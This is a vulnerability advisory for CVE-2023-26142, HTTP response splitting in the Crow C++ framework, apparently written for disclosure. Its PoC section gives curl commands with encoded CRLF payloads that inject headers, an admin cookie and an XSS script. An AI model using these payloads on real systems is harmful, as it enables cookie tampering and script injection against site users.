HTTP Response Splitting in Crow@v1.0+5

 [Raw](/dellalibera/9247769cc90ed96c0d72ddbcba88c65c/raw/67c606c1eaa3191605b45a492e2d711341817efe/01_HTTP_Response_Splitting_Crow%40v1.0%2B5.md)

[**01\_HTTP\_Response\_Splitting\_Crow@v1.0+5.md**](#file-01_http_response_splitting_crow-v1-0-5-md)

# Information

**Project:** `CrowCpp/Crow`

**Tested Version:** `v1.0+5` (commit `dfc57edc237445a2459858d63b43195d41152522`)

**Github Repository:** [`https://github.com/CrowCpp/Crow`](https://github.com/CrowCpp/Crow)

## Details

`CrowCpp/Crow` is vulnerable to **HTTP Response Splitting** when untrusted user input is used to build headers values. Headers values are not properly sanitized against CRLF Injection in `set_header` (<https://github.com/CrowCpp/Crow/blob/dfc57edc237445a2459858d63b43195d41152522/include/crow/http_response.h#L51>) and `add_header`(<https://github.com/CrowCpp/Crow/blob/dfc57edc237445a2459858d63b43195d41152522/include/crow/http_response.h#L58>) functions. An attacker can add the `\r\n` (carriage return line feeds) characters to end the HTTP response headers and inject malicious content, like for example additional headers or new response body, leading to a potential XSS vulnerability.

More reference about this vulnerability and its impact:

* <https://owasp.org/www-community/attacks/HTTP_Response_Splitting>
* <https://cwe.mitre.org/data/definitions/113.html>

Reference to similar issues affecting other projects:

* <https://security.snyk.io/vuln/SNYK-SWIFT-APPLESWIFTNIO-3105796>

## Setup

Install the dependencies and the project:

```
sudo apt install libboost-dev
wget https://github.com/CrowCpp/Crow/releases/download/v1.0%2B5/crow-v1.0+5.deb
sudo apt install ./crow-v1.0+5.deb

```
## PoC

The PoC demonstrates how it's possible to add arbitrary headers and response body if user controlled values are used to set the headers value or the redirect.

* build and run the `server` file:

```
g++ server.cpp -o server -lpthread
./server

```

* run the following `curl` command to observe the response (or directly open the link in the browser to see the xss alert)

```
curl -i -X GET "http://localhost:8000/test2?q=test%0d%0aFoo:+Bar%0d%0aSet-Cookie:admin%3D1%0d%0aContent-Length:40%0d%0aContent-Type:text/html%0d%0a%0a%3Cimg+src%3dx+onerror%3dalert(%22hello%22)+/%3E%0d%0a"
HTTP/1.1 200 OK
x-custom-header: test
Foo: Bar
Set-Cookie:admin=1
Content-Length:40
Content-Type:text/html

<img src=x onerror=alert("hello") />

```

* run the following `curl` command to objserve additional headers added:

```
curl -i -X GET "http://localhost:8000/test1?redirect=/test3%0d%0aFoo:+Bar%0d%0aSet-Cookie:admin%3D1"
HTTP/1.1 307 Temporary Redirect
location: http://localhost:8000/test3
Foo: Bar
Set-Cookie:admin=1
Content-Length: 0
Server: Crow/1.0
Date: Tue, 16 May 2023 08:00:03 GMT
Connection: Keep-Alive

```
## Impact

If untrusted user input is placed in header values, a malicious user could inject additional headers or new response body, leading to a potential XSS vulnerability or a number of other issues.

[CVE-2023-26142  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2023-26142) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-113  (opens in a new tab)](https://cwe.mitre.org/data/definitions/113.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses
## How to fix?

There is no fixed version for `Crow`.

## Overview

[Crow](https://crowcpp.org) is a C++ microframework for running web services.

Affected versions of this package are vulnerable to Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting') when untrusted user input is used to build header values. Header values are not properly sanitized against CRLF Injection in the `set_header` and `add_header` functions. An attacker can add the `\r\n` (carriage return line feeds) characters to end the HTTP response headers and inject malicious content.

### CVSS Scores

version 3.1
### Snyk

6.5 medium

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is some loss of confidentiality. Access to some restricted information is obtained, but the attacker does not have control over what information is obtained, or the amount or kind of loss is limited. The information disclosure does not cause a direct, serious loss to the impacted component.

  **Low**
* Integrity (I)

  Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is limited. The data modification does not have a direct, serious impact on the impacted component.

  **Low**
* Availability (A)

  There is no impact to availability within the impacted component.

  **None**
